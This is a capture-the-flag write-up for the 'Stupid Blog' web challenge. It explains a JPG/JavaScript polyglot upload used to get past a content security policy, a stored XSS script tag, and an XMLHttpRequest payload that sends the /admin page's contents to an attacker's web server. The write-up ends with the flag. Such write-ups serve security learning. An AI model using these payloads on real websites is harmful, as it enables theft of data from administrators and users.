Stupid Blog
===
We have a XSS injection in the description form. But because of content policy, we can't execute any Javascript.
We need to load a script from the server.
Using a crafted profile picture that has the JPG header we can load any JS code we want:
```
ÿØÿÛ=''; any JS code here...
```
As we can see, we have httpOnly flag, so we can't steal the cookie, in that way, we need to craft some js code to steal content of the /admin page where we will see the flag:
```
 ÿØÿÛ='';

 function loadDoc() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange= function() {
     if (this.readyState == 4 && this.status == 200) {
     document.location = "http://your web server/index.html?content=" + encodeURI(this.responseText);
     }
   };
   xhttp.open("GET", "admin", true);
   xhttp.send();
 }

 loadDoc();
```
Save this code as profile.jpg, upload it. Then, inject the following code into description:
```
<script charset='ISO-8859-1' src="/your_username/pfp"></script>
```
We need a custom charset because UTF will interpret the JPG header in a wrong way.
Now, report yourself to the admin and kboom, you have the flag.

You can run a web server like this `python -m SimpleHTTPServer 80` and don't forget about port forwarding.

tjctf{1m4g3_p0lygl0t_1s_w3ird}
